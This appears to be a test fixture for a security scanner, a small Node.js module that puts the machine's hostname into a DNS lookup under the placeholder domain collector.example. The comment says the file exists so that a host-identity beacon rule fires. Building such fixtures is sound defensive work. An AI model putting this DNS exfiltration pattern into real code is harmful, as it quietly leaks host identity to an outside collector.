// DNS-fallback exfil control: host identity composed into a computed
// lookup name. No UUID label involved, so the identity-label twin stays
// silent while the host-identity beacon must fire.
const os = require('os');
const dns = require('dns');
const crypto = require('crypto');
const DOMAIN = 'collector.example';
function report() {
  const host = os.hostname();
  const id = crypto.randomBytes(4).toString('hex');
  const name = [id, host.toLowerCase(), DOMAIN].join('.');
  dns.lookup(name, () => {});
}
module.exports = report;
